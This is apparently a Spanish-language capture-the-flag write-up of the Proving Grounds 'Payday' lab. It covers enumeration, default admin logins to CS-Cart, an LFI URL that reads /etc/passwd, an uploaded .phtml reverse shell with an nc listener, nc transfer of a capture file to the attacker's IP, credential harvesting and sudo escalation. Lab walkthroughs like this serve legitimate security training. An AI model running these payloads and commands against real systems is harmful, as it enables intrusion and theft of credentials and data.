---
layout: post
title: Payday (Linux - Intermediate) - Proving Grounds Practice
date: 08.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, Privilege Escalation, Lateral Movement, CMS, CS-CART, CS-Cart 1.3.3, ExploitDB, Feroxbuster, Fuzzing, Local File Inclusion, LFI, RCE, Authenticated RCE, MySQL, Database, Wireshark, SUDOERS, Intermediate]
---

# Resolución paso a paso de la máquina Payday:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.229.39 -oG allPorts
```

![image.png](assets/img/post-img/Payday/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p22,139,445,631,2181,2222,8080,8081,46295 --min-rate 5000 192.168.229.98 -oN targeted
```

![image.png](assets/img/post-img/Payday/image%201.png)

![image.png](assets/img/post-img/Payday/image%202.png)

### WEB - HTTP/HTTPS

- Accedemos a la web y nos encontramos con lo que parece ser un **GESTOR DE CONTENIDO (CS-CART)** para **E-COMMERCE**. Probamos credenciales por defecto y parece que nos permite acceder (¿como clientes?) bajo el usuario **ADMIN**.

> User: admin
Password: admin
> 

![image.png](assets/img/post-img/Payday/image%203.png)

![image.png](assets/img/post-img/Payday/image%204.png)

![image.png](assets/img/post-img/Payday/image%205.png)

### FEROXBUSTER (Directory Fuzzing)

- Seguimos enumerando y lanzamos **FEROXBUSTER** para descubrir algunos directorios. Encontramos un **ADMIN.PHP** con un panel de **LOGIN** para acceder como **ADMINISTRADORES** del **CMS**:

```bash
feroxbuster --url http://192.168.229.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301
```

![image.png](assets/img/post-img/Payday/image%206.png)

- Probamos credenciales por defecto y accedemos al **PANEL de ADMINISTRADOR**:

> User: admin
Password: admin
> 

![image.png](assets/img/post-img/Payday/image%207.png)

![image.png](assets/img/post-img/Payday/image%208.png)

![image.png](assets/img/post-img/Payday/image%209.png)

- Una vez tenemos acceso como **ADMIN** podemos intentar enumerar varias formas de lograr un **RCE** o de lanzarnos una **REVERSE SHELL** y ganar acceso al sistema.

### EXPLOITDB

- Realizamos un poco de investigación y encontramos un posible **LFI** para la versión **1.1.3 de CS-Cart**, que es la que está corriendo en este caso.

**LFI**

- Listamos el **/ETC/PASSWD** y descubrimos que hay un usuario **PATRICK**:

[CS-Cart 1.3.3 - 'classes_dir' LFI](https://www.exploit-db.com/exploits/48890)

```bash
http://192.168.229.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

![image.png](assets/img/post-img/Payday/image%2010.png)

- Seguimos investigando otras alternativas pero no conseguimos nada más por esta via.

## EXPLOTACIÓN

- Encontramos una opción para un **AUTHENTICATED RCE** a través de la sección (**LOOK AND FEEL > TEMPLATE EDITOR**) donde podemos subir una **REVERSE SHELL** renombrando el archivo a **“.PHTML”**.

[CS-Cart 1.3.3 - authenticated RCE](https://www.exploit-db.com/exploits/48891)

- La información que en este caso encontramos en **EXPLOITDB** parece insuficiente para entender bien el ataque en ese momento y encontramos una entrada en **GITHUB** donde parece que se explica mucho mejor:

[cs cart authenticated RCE](https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c)

![image.png](assets/img/post-img/Payday/image%2011.png)

- Primero generamos la **REVERSE SHELL** y la cargamos:

![image.png](assets/img/post-img/Payday/image%2012.png)

- Subimos el archivo:

![image.png](assets/img/post-img/Payday/image%2013.png)

- Una vez subido el archivo, nos ponemos en escucha con **NC** y accedemos al directorio que nos indicaba:

```bash
http://[víctima]/skins/rshell.phtml
```

- Recibimos la conexión:

```bash
nc -lvnp 4444
```

![image.png](assets/img/post-img/Payday/image%2014.png)

### TRATAMIENTO DE LA TTY

- Realizamos el tratamiento de la **TTY** para poder trabajar más cómodos desde una **SHELL INTERACTIVA**:

```bash
script /dev/null -c bash

control+z

stty raw -echo; fg

reset xterm

export TERM=xterm-256color

export SHELL=bash

stty rows 52 columns 214 
```

- Accedemos al directorio **HOME** de **PATRICK** y podemos leer la primera **FLAG**:

![image.png](assets/img/post-img/Payday/image%2015.png)

## MOVIMIENTO LATERAL

- Empezamos a enumerar y encontramos un archivo **CONFIG.PHP** que contiene información de la **BBDD** que incluye credenciales para conectarnos como **ROOT**:

```bash
cat /var/www/config.php
```

![image.png](assets/img/post-img/Payday/image%2016.png)

![image.png](assets/img/post-img/Payday/image%2017.png)

![image.png](assets/img/post-img/Payday/image%2018.png)

- Nos conectamos a la **BBDD** como el usuario **ROOT** directamente hacia el puerto por defecto de **MYSQL** en el **LOCALHOST**:

```bash
mysql -u root -p'root' -h 127.0.0.1 -P 3306
```

![image.png](assets/img/post-img/Payday/image%2019.png)

- En una de las bases de datos encontramos credenciales, que parece son las propias credenciales con las que nos hemos conectado a la **BBDD** ya que estaban en esa misma **BBDD** que siempre está por defecto:

![image.png](assets/img/post-img/Payday/image%2020.png)

```bash
*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
```

![image.png](assets/img/post-img/Payday/image%2021.png)

- Después de un rato analizando y enumerando la base de datos descartamos esta via, pues no parece haber nada más interesante.

- En el directorio **ROOT** encontramos un archivo “**.CAP**” que parece el tipico archivo de **WIRESHARK** donde puede haber información de trafico de red, conexiones, autenticaciones.. Nos lo pasamos a nuestra máquina atacante para poder analizarlo.

```bash
# Máquina atacamte - (Recibimos el archivo)
nc -lvp 4455 > capture.cap

# Máquina víctima - (Enviamos el archivo)
nc -w 3 192.168.45.223 4455 < capture.cap
```

![image.png](assets/img/post-img/Payday/image%2022.png)

- Una vez tenemos el archivo en nuestra máquina podemos abrirlo con **WIRESHARK**:

```bash
wireshark capture.cap
```

![image.png](assets/img/post-img/Payday/image%2023.png)

- Encontramos unas credenciales que se han utilizado en un proceso de autenticación contra un **SERVIDOR FTP**:

![image.png](assets/img/post-img/Payday/image%2024.png)

> User: brett
Password: ilovesecuritytoo
> 

- Después de repasar toda la información que tenemos sobre el objetivo vemos que no hay ningún servicio **FTP** ejecutándose y pasamos a otra opción.

- Después de enumerar la versión de **LINUX**, la versión de **SUDO**, de **BASH**, de mirar procesos en ejecución, capabilities, permisos **SUID**… y de casi morir sin encontrar nada..  Probamos los mas sencillo y absurdo y nos funciona. Usamos el mismo nombre de usuario **PATRICK** como contraseña:

```bash
su patrick
```

> User: patrick
Password: patrick
> 

![image.png](assets/img/post-img/Payday/image%2025.png)

## ESCALADA DE PRIVILEGIOS

- Una vez estamos bajo el usuario **PATRICK**, lanzamos **“SUDO -L”** y vemos que podemos ejecutar cualquier cosa con privilegios de **ROOT**:

```bash
sudo -l
```

![image.png](assets/img/post-img/Payday/image%2026.png)

- Lanzamos un **SUDO SU**, le pasamos la contraseña y ya somos **ROOT**:

```bash
sudo su
```

![image.png](assets/img/post-img/Payday/image%2027.png)

- Ahora ya podemos ir al directorio **ROOT** y leer la **FLAG**:

![image.png](assets/img/post-img/Payday/image%2028.png)